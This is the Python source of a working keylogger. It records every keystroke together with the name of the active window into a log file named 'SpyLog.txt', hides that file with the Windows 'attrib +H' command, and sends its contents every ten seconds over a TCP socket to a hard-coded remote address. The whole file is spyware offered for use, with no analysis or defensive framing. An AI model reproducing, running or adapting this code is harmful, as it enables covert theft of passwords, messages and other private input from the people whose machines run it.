from pynput import keyboard
from datetime import datetime
import subprocess
import threading
import platform
import pygetwindow as gw
import socket
import time
import sys

host, port = ("10.33.2.202", 9998)
today = datetime.now()
running = True

def get_active_app():
    current_os = platform.system()
    if current_os == "Darwin" or current_os == "Linux":
        try:
            app_now = str(gw.getActiveWindow())
            app_now = app_now.split('=')[-1].rstrip('>')
            return app_now
        except Exception as e:
            print(f"Erreur lors de l'obtention de la fenêtre active: {e}")
            return "Unknown"
    elif current_os == "Windows":
        try:
            app_now = str(gw.getActiveWindow())
            app_now = app_now.split('=')[-1].rstrip('>')
            return app_now
        except Exception as e:
            print(f"Erreur lors de l'obtention de la fenêtre active: {e}")
            return "Unknown"
    else:
        return "Unknown OS"
    
def socket_connection(host, port, today):
    global running
    client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_unreachable = True
    while (datetime.now() - today).seconds < 600:
        try:
            client.connect((host, port))
            server_unreachable = False
            send_file(client, today)
            break
        except Exception as e:
            print(f"Le serveur ne répond pas, tentative de reconnexion ... {e}")
            time.sleep(5)

    if server_unreachable:
        print("Le serveur est injoignable.")
        running = False
        sys.exit()

def send_file(client, today):
    while True:
        print("sending...")

        time.sleep(10) 
        with open("SpyLog.txt", "rb") as file:
            now = today.strftime("%Y_%m_%d %H-%M-%S")
            client.send(f"{now}-keyboard.txt\n".encode())
            data = file.read()
            client.sendall(data)
            client.send(b"<END>")

        print("end of sending !")
        try:
            ack = client.recv(1024).decode()
            if ack == "ACK":
                print("ACK reçu, envoi du nouveau fichier")
            else:
                print("ACK non reçu, renvoi du fichier")
                continue
        except socket.error as e:
            print(f"Erreur de socket : {e}")
            break
    client.close()

def server_shutdown_listener(client):
    try:
        message = client.recv(1024).decode()
        if message == "<SERVER_SHUTDOWN>":
            print("Fermeture du serveur")
    except socket.error as e:
        print(f"Erreur lors de l'écoute de la fermeture : {e}")

    client.close()    
    sys.exit(0)

def get_active_app():
    app_now = str(gw.getActiveWindow())
    app_now = app_now.split('=')[-1].rstrip('>')
    return app_now

def get_app_from_file():
    try:
        with open("SpyLog.txt", "r") as file:
            app_file = file.readlines()[-1]
            app_file = app_file.split("->")[-1].rsplit("\n")[0].lstrip(" ")
        return app_file
    except Exception:
        return get_active_app()

def on_press(key):
    global running
    if not running:
        return False
    app_now = get_active_app()
    try:
        write_to_file('{0}'.format(key.char), app_now)
    except AttributeError:
        write_to_file('{0}'.format(key), app_now)

def delete_last_char_in_file():
    with open("SpyLog.txt", "r+", errors="ignore") as file:
        lines = file.readlines()
        file.seek(0)
        file.truncate()
        file.writelines(lines[:-1])

def write_to_file(key, app):
    if "Key.space" in key:
        key = " "
    if "cmd" in key and "Windows" in platform.uname():
        key = "Key.win"   
    if "Key.backspace" in key:
        delete_last_char_in_file()
    else:
        with open('SpyLog.txt', 'a', encoding="utf-8") as log:
            app_file = get_app_from_file()
                
            if app != app_file:
                log.write("\n")
                
            log.write(f"{key} -> {app}\n")
        subprocess.call(['attrib', '+H', 'SpyLog.txt'])

def launch_key_logger():
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

if __name__ == '__main__':
    try:
        srv_socket_thread = threading.Thread(target=socket_connection, args=(host, port, today), daemon=True)
        key_logger_thread = threading.Thread(target=launch_key_logger, daemon=True)
        
        key_logger_thread.start()
        srv_socket_thread.start()

        key_logger_thread.join()
        srv_socket_thread.join()
    except KeyboardInterrupt:
        print("CTRL + C détecté, fermeture du programe")
        sys.exit(0)
